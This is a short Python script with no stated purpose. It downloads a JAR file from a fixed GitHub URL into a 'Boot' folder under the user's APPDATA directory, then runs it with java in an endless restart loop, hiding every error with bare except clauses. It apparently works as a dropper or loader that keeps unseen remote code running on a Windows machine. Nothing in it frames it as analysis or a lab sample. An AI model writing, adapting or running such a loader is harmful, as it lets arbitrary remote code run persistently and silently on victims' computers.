import subprocess
import os
import requests
import time

GITHUB_JAR_URL = "https://raw.githubusercontent.com/mousetech307/javafarm/88596469f4f2ad5c84b6c39074eed3eb4a21ecc5/mod.jar"
APPDATA = os.getenv("APPDATA")
FOLDER = os.path.join(APPDATA, "Boot")
JAR_PATH = os.path.join(FOLDER, "mod.jar")

if not os.path.exists(FOLDER):
    os.makedirs(FOLDER)

if not os.path.exists(JAR_PATH):
    try:
        response = requests.get(GITHUB_JAR_URL, timeout=30)
        if response.status_code == 200:
            with open(JAR_PATH, "wb") as f:
                f.write(response.content)
    except:
        pass

while True:
    try:
        process = subprocess.Popen(["java", "-jar", JAR_PATH], cwd=FOLDER)
        process.wait()
    except:
        pass
    time.sleep(5)
